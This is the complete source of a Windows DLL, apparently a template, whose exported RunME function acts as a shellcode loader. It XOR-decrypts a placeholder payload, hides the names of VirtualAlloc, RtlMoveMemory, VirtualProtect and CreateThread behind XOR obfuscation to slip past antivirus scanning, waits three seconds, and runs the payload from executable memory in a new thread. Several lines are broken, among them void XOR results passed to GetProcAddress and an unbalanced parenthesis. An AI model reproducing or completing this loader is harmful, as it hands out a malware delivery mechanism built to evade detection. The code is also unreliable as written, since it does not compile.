#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef LPVOID(WINAPI *PVAlloc)(PVOID, SIZE_T, DWORD, DWORD);
typedef VOID (WINAPI * PRMMemory)(LPVOID,  const void*, SIZE_T );
typedef BOOL (WINAPI * PVProtect)( LPVOID , SIZE_T , DWORD , PDWORD );
typedef HANDLE(WINAPI *PCThread)(PSECURITY_ATTRIBUTES, SIZE_T, PTHREAD_START_ROUTINE, PVOID, DWORD, PDWORD);
typedef DWORD(WINAPI *PWFSObject)(HANDLE, DWORD);

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
        int j;
        j = 0;
        for (int i = 0; i < data_len; i++) {
                if (j == key_len - 1) j = 0;

                data[i] = data[i] ^ key[j];
                j++;
        }
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

extern "C" {
        __declspec(dllexport) BOOL WINAPI RunME(void) {
                void * exec_mem;
                BOOL rv;
                HANDLE th;
                DWORD oldprotect = 0;

                unsigned char payload[] = "payload:";
                unsigned int pay_len = sizeof(payload);
                char key[] = "key:";
                HMODULE hKernel32 = GetModuleHandle("Kernel32.dll");
                PVAlloc pVirtualAlloc = (PVAlloc)GetProcAddress(hKernel32, XOR("VirtualAlloc:", pay_len, key, sizeof(key))));
                exec_mem = pVirtualAlloc(0, pay_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                Sleep(3000);
                XOR((char *) payload, pay_len, key, sizeof(key));
                PRMMemory pRtlMoveMemory = (PRMMemory)GetProcAddress(GetModuleHandle("Ntdll.dll"), XOR("RtlMoveMemory:",pay_len, key, sizeof(key)));
                pRtlMoveMemory(exec_mem, payload, pay_len);
                PVProtect pVirtualProtect = (PVProtect)GetProcAddress(hKernel32, XOR("VirtualProtect:",pay_len, key, sizeof(key)));
                rv = pVirtualProtect(exec_mem, pay_len, PAGE_EXECUTE_READ, &oldprotect);
                if ( rv != 0 ) {
                        PCThread pCreateThread = (PCThread)GetProcAddress(hKernel32, XOR("CreateThread:",pay_len, key, sizeof(key)));
                        th = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
                        PWFSObject pWaitForSingleObject = (PWFSObject) GetProcAddress(hKernel32, "WaitForSingleObject");
                        pWaitForSingleObject(th, -1);
                }

                return TRUE;
        }
}
